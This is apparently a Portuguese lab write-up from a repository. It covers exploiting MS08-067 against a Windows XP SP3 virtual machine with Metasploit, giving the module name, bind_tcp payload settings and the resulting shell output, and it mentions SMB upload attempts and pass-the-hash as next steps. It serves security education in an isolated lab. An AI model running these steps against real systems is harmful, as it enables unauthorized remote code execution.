Exploração Controlada da Vulnerabilidade MS08-067 (Windows XP SP3)

Este repositório documenta um laboratório controlado de cibersegurança executado em ambiente isolado, com foco em análise prática da vulnerabilidade MS08-067 (NetAPI) utilizando o Metasploit Framework.
O objetivo é reforçar fundamentos de exploração, pós-exploração e análise de limitações de infraestrutura em cenários corporativos.

1. Arquitetura do Ambiente
Componente	Descrição
Atacante	Kali Linux via WSL2
Alvo	Windows XP SP3 (VirtualBox – Host-Only Network)
Rede	192.168.56.0/24
Ferramentas	Metasploit Framework 6, Nmap
Isolamento	Ambiente 100% offline e sem exposição externa
2. Escaneamento e Identificação do Serviço

A porta 445/TCP foi identificada como ativa.
O alvo corresponde a:

Windows XP SP3 – Português Brasil

3. Execução do Exploit MS08-067

Módulo utilizado:

exploit/windows/smb/ms08_067_netapi


Devido às restrições do WSL2 (não aceita conexões reverse), foi necessário utilizar payload bind_tcp:

set PAYLOAD windows/shell/bind_tcp
set RHOSTS 192.168.56.102
set TARGET 51

Resultado
Command shell session 1 opened
Microsoft Windows XP [Versão 5.1.2600]


Sessão obtida com sucesso.

4. Pós-Exploitação e Limitações Identificadas

Após o acesso inicial:

O payload abriu apenas um shell básico, sem funções avançadas de pós-exploração.

Módulos Metasploit não funcionam diretamente dentro do CMD.

WSL2 impossibilita qualquer payload reverse_tcp, devido ao isolamento de rede.

Tentativa de upload SMB

Módulo testado:

auxiliary/admin/smb/upload_file


Resultado:

Rejeição de autenticação SMB (STATUS_LOGON_FAILURE)

A conta local não possuía privilégios suficientes

O XP ainda apresentava “Erro de Sistema 5” em operações administrativas

5. Insights Técnicos

Bind shells são o único modelo funcional no WSL2.

Sessões de shell simples não suportam módulos avançados.

Autenticação SMB exige credenciais privilegiadas.

MS08-067 continua relevante para estudos de Remote Code Execution em ambientes legados.

O comportamento do WSL2 limita técnicas de pós-exploração — preferencial usar uma VM Kali completa para payloads avançados.

6. Próximos Passos

Migrar para Kali Linux em máquina virtual real.

Testar session upgrade via payload dropper.

Avaliar pass-the-hash em contas locais.

Documentar novos vetores de escalonamento de privilégio.

7. Aviso

Este material é exclusivamente educacional, utilizado em ambiente isolado e controlado.
Nenhuma técnica aqui descrita deve ser aplicada em sistemas reais ou sem autorização explícita.
